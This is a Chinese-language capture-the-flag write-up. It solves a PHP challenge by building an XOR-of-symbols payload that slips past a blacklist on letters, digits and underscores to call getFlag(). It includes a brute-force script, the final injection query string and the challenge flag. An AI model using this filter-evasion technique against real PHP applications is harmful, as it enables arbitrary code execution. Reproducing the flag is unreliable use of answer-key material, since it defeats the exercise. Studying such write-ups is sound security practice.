
# writeup

首先, bash_token需要设置为t的值即1

其次就是构造code可执行代码, 不能超过50个字符, 不能是大小写字母数字和下划线  
绕过这个才能打印出flag

提示是可以使用getFlag()方法

绕过字符检查的方法就是使用位运算(与,或,非,异或)  
通过位运算得到正常字符的ord


可以穷举一下两个特殊字符如何运算会得到一个可视字符

```python
chrs = ['@', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '[', '\\', ']', '^', '`', '{', '|', '}', '~']

for i in chrs :
    for j in chrs :
        k = (chr(ord(i) ^ ord(j)))
        if k in '_getFlag':
            print(i + ' xor ' + j + ' => ' + k)
```

如果我们要构造出一个`getFlag()`的调用, $code里不能出现`getFlag_`字符  
于是, 我们可以把getFlag字符放在另外一个变量X里, 然后调用该变量`$X()`  
变量边界可以通过`${}`来括起来, 使用下划线表示变量X

```
(1) "!" ^ "~"      #=> _
(2) ${"!" ^ "~"}   #=> $_
(3) ${"!" ^ "~"}() #=> $_()
(4) "getFlag"      #=> "]%];,<<" ^ ":@)}@]["
```

得到的组合很多, 选取其中一组即可

构成语句形如`(2)=(4);(3);`:  
`${ "!" ^ "~" } = "]%];,<<" ^ ":@)}@][" ; ${ "!" ^ "~" }() ;`

由于长度限制在50个字符, 所以还是要压缩一下空格

最终参数:  
`?t=1&code=${"!"^"~"}="]%];,<<"^":@)}@][";${"!"^"~"}();`

提交得到结果:
`flag{3350a246b489aeec436a711c21f1efb7}`